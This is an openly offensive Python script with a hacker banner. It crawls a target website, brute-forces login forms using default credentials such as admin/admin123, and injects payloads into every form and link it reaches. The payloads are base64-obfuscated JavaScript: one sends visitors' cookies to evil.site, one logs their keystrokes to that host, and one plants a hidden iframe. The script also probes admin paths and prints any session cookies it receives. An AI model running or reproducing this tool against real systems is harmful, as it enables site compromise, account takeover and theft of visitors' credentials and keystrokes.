#!/usr/bin/env python3
import requests, urllib.parse, random, string, warnings, sys, os
from bs4 import BeautifulSoup
import base64
from colorama import init, Fore, Style

init(autoreset=True)
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
session = requests.Session()
session.headers.update({
    "User-Agent": random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "curl/7.64.1",
    ])
})

### ████  BANNER  ████ ###
def banner():
    print(Fore.RED + """
                          _____                           
                   _.+sd$$$$$$$$$bs+._                   
               .+d$$$$$$$$$$$$$$$$$$$$$b+.                
            .sd$$$$$$$P^*^T$$$P^*"*^T$$$$$bs.            
          .s$$$$$$$$P*     `*' _._  `T$$$$$$$s.          
        .s$$$$$$$$$P          ` :$;   T$$$$$$$$s.        
       s$$$$$$$$$$;  db..+s.   `**'    T$$$$$$$$$s       
     .$$$$$$$$$$$$'  `T$P*'             T$$$$$$$$$$.     
    .$$$$$$$$$$$$P                       T$$$$$$$$$$.    
   .$$$$$$$$$$$$$b                       `$$$$$$$$$$$.   
  :$$$$$$$$$$$$$$$.                       T$$$$$$$$$$$;  
  $$$$$$$$$P^*' :$$b.                     d$$$$$$$$$$$$  
 :$$$$$$$P'      T$$$$bs._               :P'`*^T$$$$$$$; 
 $$$$$$$P         `*T$$$$$b              '      `T$$$$$$ 
:$$$$$$$b            `*T$$$s                      :$$$$$;
:$$$$$$$$b.                                        $$$$$;
$$$$$$$$$$$b.                                     :$$$$$$
$$$$$$$$$$$$$bs.                                 .$$$$$$$
$$$$$$$$$$$$$$$$$bs.                           .d$$$$$$$$
:$$$$$$$$$$$$$P*"*T$$bs,._                  .sd$$$$$$$$$;
:$$$$$$$$$$$$P     TP^**T$bss++.._____..++sd$$$$$$$$$$$$;
 $$$$$$$$$$$$b           `T$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 
 :$$$$$$$$$$$$b.           `*T$$P^*"*"*^^*T$$$$$$$$$$$$; 
  $$$b       `T$b+                        :$$$$$$$BUG$$  
  :$P'         `"'               ,._.     ;$$$$$$$$$$$;  
   \\                            `*TP*     d$$P*******$   
    \\                                    :$$P'      /    
     \\                                  :dP'       /     
      `.        [ @Sigma_Cyber_Ghost ] d$P       .'      
        `.                             `'      .'        
          `-.                               .-'          
             `-.                         .-'             
                `*+-._             _.-+*'                
                      `"*-------*"'"                
""")

### ████  PAYLOADS ████ ###
def encode(js): return base64.b64encode(js.encode()).decode()

def extreme_payloads():
    return (
        f"<script>eval(atob('{encode('fetch(\"http://evil.site/cookie?data=\"+document.cookie)')}'));</script>" +
        f"<script>eval(atob('{encode('document.onkeydown=function(e){fetch(\"http://evil.site/key?c=\"+e.key)}')}'));</script>" +
        f"<iframe src='http://evil.site/ad.html' style='display:none'></iframe>"
    )

### ████  ATTACK FORMS ████ ###
def attack_form(form, url):
    action = form.get("action", "")
    method = form.get("method", "GET").upper()
    target = urllib.parse.urljoin(url, action)
    fields = [i.get("name") for i in form.find_all("input") if i.get("name")]

    u_field = next((f for f in fields if "user" in f.lower() or "email" in f.lower()), None)
    p_field = next((f for f in fields if "pass" in f.lower()), None)

    if not u_field or not p_field:
        session.post(url, data={"x": extreme_payloads()}, verify=False)
        print(Fore.YELLOW + f"[!] Malware planted on {url}")
        return

    for user, pwd in [("admin", "admin123"), ("root", "toor"), ("user", "123456")]:
        try:
            resp = session.post(target, data={u_field: user, p_field: pwd}, timeout=5, verify=False)
            if "invalid" not in resp.text.lower():
                session.post(target, data={u_field: extreme_payloads()}, verify=False)
                print(Fore.GREEN + f"[+] LOGIN SUCCESS: {user}/{pwd} @ {target}")
                return
        except Exception as e:
            print(Fore.RED + f"[-] Error @ {target}: {e}")

    print(Fore.RED + f"[-] Bruteforce failed on {target}")

### ████  SPIDER ████ ###
def spider(url, depth=5, visited=None):
    if visited is None: visited = set()
    if url in visited or depth == 0: return
    visited.add(url)

    try:
        resp = session.get(url, timeout=5, verify=False)
        soup = BeautifulSoup(resp.text, "html.parser")
        print(Fore.CYAN + f"[~] Crawled {url}")
    except:
        print(Fore.RED + f"[-] Failed to load {url}")
        return

    for form in soup.find_all("form"):
        attack_form(form, url)

    for link in soup.find_all("a", href=True):
        absolute = urllib.parse.urljoin(url, link.get("href"))
        if absolute.startswith("http") and absolute not in visited:
            try:
                session.post(absolute, data={"malicious": extreme_payloads()}, verify=False)
                print(Fore.MAGENTA + f"[+] Injected payloads into {absolute}")
            except:
                print(Fore.RED + f"[-] Injection failed on {absolute}")
            spider(absolute, depth-1, visited)

### ████  ADMIN COOKIE THEFT ████ ###
def steal_admin(url):
    for path in ["/admin", "/dashboard", "/wp-admin", "/cpanel"]:
        full = urllib.parse.urljoin(url, path)
        try:
            resp = session.get(full, verify=False, timeout=5)
            cookies = resp.cookies.get_dict()
            if cookies:
                print(Fore.GREEN + f"[+] Admin cookies @ {full}: {cookies}")
            if "session" in resp.text.lower() or "auth" in resp.text.lower():
                print(Fore.YELLOW + f"[+] Session leak at {full}")
        except:
            print(Fore.RED + f"[-] Failed to scan {full}")

### ████  EXECUTE ████ ###
def execute(target):
    banner()
    print(Fore.CYAN + "\n⚙️ Starting Extreme Attack Phase...")
    spider(target)
    steal_admin(target)
    print(Fore.GREEN + "\n✅ Attack Sequence Complete.")

### ████  ENTRYPOINT ████ ###
if __name__ == "__main__":
    try:
        target = input(Fore.CYAN + "\n[*] Target URL: ").strip()
        execute(target)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted.")
        sys.exit(0)
